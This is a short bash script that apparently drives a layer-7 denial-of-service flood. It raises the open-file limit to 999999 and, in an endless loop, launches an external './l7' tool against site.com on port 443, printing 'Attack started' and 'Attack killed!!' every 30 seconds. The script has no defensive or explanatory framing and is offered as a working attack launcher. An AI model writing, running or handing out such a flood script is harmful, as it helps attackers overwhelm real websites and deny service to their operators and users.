#!/bin/bash
atk_cmd="./l7 site.com 443 / 1600 30"
process=1
ulimit -n 999999

while true
do
    echo Attack started
    for ((i=1;i<=$process;i++))
    do
        $atk_cmd >/dev/null &
        sleep 0.1
    done
    sleep 30
    echo Attack killed!!
done
